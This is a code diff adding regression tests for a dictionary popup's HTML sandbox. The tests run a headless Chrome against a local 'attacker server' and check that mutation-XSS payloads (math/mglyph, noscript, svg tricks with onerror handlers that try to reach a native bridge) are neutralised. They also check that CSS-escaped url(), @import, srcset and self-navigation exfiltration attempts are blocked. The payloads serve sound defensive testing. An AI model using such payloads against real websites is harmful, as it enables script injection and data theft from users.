@@ -8,6 +8,7 @@
 // 不覆盖：Android addJavascriptInterface 那类「桥注入所有 frame」的宿主行为——那由各平台
 // 原生的桥锁定补丁负责（见 docs/specs/2026-10-23-dictionary-script-sandbox.md）。
 import fs from 'node:fs';
+import http from 'node:http';
 import assert from 'node:assert/strict';
 import { launchChromeDriver, resolveChrome } from '../../../tool/reader_pitch_headless/cdp_client.mjs';
 
@@ -19,6 +20,47 @@ if (!resolveChrome()) {
 const scripts = JSON.parse(fs.readFileSync(process.argv[2], 'utf8'));  // NOSONAR: path comes from the Dart test harness
 
 const LOCKED = 'fushi-bridge-locked-v1';
+
+// 「攻击者服务器」：记录收到的每个请求（`/page` 除外——那是下面 evalOnServedPage 供测试页
+// 用的）。外联场景的测试页从 http://localhost 供、攻击者地址用 127.0.0.1：两者不同源，
+// CSP 的 'self' 放不过攻击者；又都是 http 源，Chrome 不会因为顶层是 data: 文档就自己拦掉
+// 子 frame 的导航——那样「沙箱自导航」场景测的就是浏览器的限制而不是我们的防护。
+const hits = [];
+let servedPage = '';
+const server = http.createServer((req, res) => {
+  if (req.url === '/page') {
+    res.setHeader('content-type', 'text/html; charset=utf-8');
+    res.end(servedPage);
+    return;
+  }
+  hits.push(req.url);
+  res.setHeader('content-type', req.url.startsWith('/nav') ? 'text/html' : 'text/plain');
+  res.end(req.url.startsWith('/nav')
+    ? '<script>parent.postMessage({__fushiDictSandbox:1,type:"error",message:"from-evil:"+location.href},"*")</script>'
+    : '');
+});
+await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
+const PORT = server.address().port;
+const EVIL = `http://127.0.0.1:${PORT}`;
+const PAGE_URL = `http://localhost:${PORT}/page`;
+const realHits = () => hits.filter((u) => u !== '/favicon.ico');
+
+async function evalOnServedPage(html, expr) {
+  servedPage = html;
+  await driver.evalOnPage('<p>reset</p>', '1');
+  await driver.evalHere(`(location.href = ${JSON.stringify(PAGE_URL)}, 1)`);
+  const deadline = Date.now() + 8000;
+  while (Date.now() < deadline) {
+    await new Promise((r) => setTimeout(r, 100));
+    try {
+      if (await driver.evalHere(
+        "location.href.endsWith('/page') && document.readyState === 'complete' && " +
+        "typeof createGlossarySection === 'function'")) break;
+    } catch (_) { /* 导航中，上下文还没换好 */ }
+  }
+  hits.length = 0;
+  return driver.evalHere(expr);
+}
 
 function page(lockReply, dictStyles) {
   const bridge = `
@@ -58,7 +100,9 @@ function renderExpr(content) {
         .filter((n) => n.startsWith('on')),
       hrefs: [...document.body.querySelectorAll('[href]')].map((el) => el.getAttribute('href')),
       srcs: [...document.body.querySelectorAll('[src]')].map((el) => el.getAttribute('src')),
-      frames: frames.map((f) => ({ sandbox: f.getAttribute('sandbox'), height: f.style.height })),
+      frames: frames.map((f) => ({ sandbox: f.getAttribute('sandbox'), csp: f.getAttribute('csp'),
+        height: f.style.height })),
+      documentCsp: (document.querySelector('meta[data-fushi-popup-csp]') || {}).content || null,
       calls: window.__calls.map((c) => c.name),
       reports: window.__calls.filter((c) => c.name === 'reportJsError')
         .map((c) => (c.args[0] && c.args[0].message) || ''),
@@ -132,6 +176,8 @@ try {
     assert.equal(r.scriptsInMain, 0, 'no script element in the main document');
     assert.equal(r.frames.length, 1, 'scripted block mounted into one iframe');
     assert.equal(r.frames[0].sandbox, 'allow-scripts', 'sandbox without allow-same-origin');
+    assert.ok(r.frames[0].csp && /default-src 'none'/.test(r.frames[0].csp),
+      'embedder csp attribute constrains the frame after navigation too');
     assert.ok(r.calls.includes('_fushiLockBridge'), 'page asked the host to lock the bridge');
     assert.ok(r.calls.includes('getDictAsset'), 'external script fetched by the parent');
     const probe = r.reports.find((m) => m.includes('probe:'));
@@ -165,7 +211,74 @@ try {
     assert.ok(r.dictStyle.includes('local.png'), 'local url kept');
     passed++;
   }
+
+  // 6. mXSS：净化后的树直接挂进文档，不经「序列化 → innerHTML」再解析（审查复现过 math 路径）。
+  for (const [name, html] of [
+    ['math-mglyph-style', '<math><mtext><table><mglyph><style><img src=x onerror="window.__pwned=\'mx\';' +
+      "flutter_inappwebview.callHandler('updateEntry',{id:1})\"></style></mglyph></table></mtext></math>"],
+    ['form-math-reparent', '<form><math><mtext></form><form><mglyph><style></math>' +
+      '<img src=x onerror="window.__pwned=\'form\'">'],
+    ['svg-style-text', '<svg><style>&lt;img src=x onerror=window.__pwned=\'svg\'&gt;</style></svg>'],
+    ['noscript-title', '<noscript><p title="</noscript><img src=x onerror=window.__pwned=\'ns\'>"></noscript>'],
+    ['title-link-quote', "<span title=\"<link href='a'><img src=x onerror=window.__pwned='lq'>\">t</span>"],
+  ]) {
+    const r = await driver.evalOnPage(page(LOCKED), renderExpr(html));
+    assert.equal(r.pwned, null, `${name}: main document must not execute (${r.pwned})`);
+    assert.ok(!r.calls.includes('updateEntry'), `${name}: bridge must not be reached`);
+    assert.deepEqual(r.onAttrs, [], `${name}: no live event handler attribute`);
+  }
+  passed++;
+
+  // 7. 导出卡片路径同样不能经 tempDiv.innerHTML 复活脚本（tempDiv 属于主文档）。
+  {
+    const mx = '<math><mtext><table><mglyph><style><img src=x onerror="window.__pwned=\'export\'">' +
+      '</style></mglyph></table></mtext></math>';
+    const r = await driver.evalOnPage(page(LOCKED), `(async () => {
+      window.lookupEntries = [{ glossaries: [{ dictionary: 'D', content: ${JSON.stringify(mx)},
+        definitionTags: '', termTags: '' }] }];
+      const html = constructGlossaryHtml(0);
+      await new Promise((r) => setTimeout(r, 500));
+      return { pwned: window.__pwned === undefined ? null : String(window.__pwned), html: String(html) };
+    })()`);
+    assert.equal(r.pwned, null, `export path must not execute (${r.pwned})`);
+    assert.ok(!/onerror/i.test(r.html), `exported HTML carries no handler (${r.html.slice(0, 200)})`);
+    passed++;
+  }
+
+  // 8. 外联兜底：正则追不完的写法（CSS 转义、image-set、imagesrcset、srcset、样式表里的
+  //    转义 @import）一个请求都不能发出去——主文档 CSP 的 img/style/font-src 只认本地。
+  {
+    const cases = [
+      `<p style="background:\\75rl(${EVIL}/esc-attr)">a</p>`,
+      `<p style="background-image:image-set('${EVIL}/imgset' 1x)">b</p>`,
+      `<style>@\\69mport '${EVIL}/imp-esc';</style><p>c</p>`,
+      `<link rel="preload" as="image" imagesrcset="${EVIL}/preload 1x"><p>d</p>`,
+      `<img srcset="${EVIL}/srcset 1x"><p>e</p>`,
+      JSON.stringify({ type: 'structured-content', content: [
+        { tag: 'span', style: { backgroundImage: `\\75rl(${EVIL}/sc-esc)` }, content: 'f' }] }),
+    ];
+    for (const content of cases) {
+      const r = await evalOnServedPage(page(LOCKED, {
+        D: `@\\69mport '${EVIL}/dictcss-imp'; .x { background: \\75rl(${EVIL}/dictcss-url); }`,
+      }), renderExpr(content));
+      assert.ok(r.documentCsp && /img-src/.test(r.documentCsp), 'document CSP installed');
+      assert.deepEqual(realHits(), [], `no request may leave the popup (${content.slice(0, 80)})`);
+    }
+    passed++;
+  }
+
+  // 9. 沙箱自导航：frame-src 在请求发出前拦住，frame 第二次 load 即被移除，导航后的页面
+  //    （若真加载了）发来的消息也不被认。
+  {
+    const r = await evalOnServedPage(page(LOCKED), renderExpr(
+      `<div>s</div><script>setTimeout(function(){ location.href = '${EVIL}/nav?w=' + 'TERM'; }, 50);</script>`));
+    assert.deepEqual(realHits(), [], `sandbox self-navigation must not reach the network (${hits})`);
+    assert.equal(r.frames.length, 0, 'navigated sandbox frame is removed');
+    assert.ok(!r.reports.some((m) => m.includes('from-evil')), 'messages from a navigated frame are ignored');
+    passed++;
+  }
 } finally {
   await driver.close();
+  server.close();
 }
 console.log(`PASS ${passed} dictionary sandbox scenarios`);
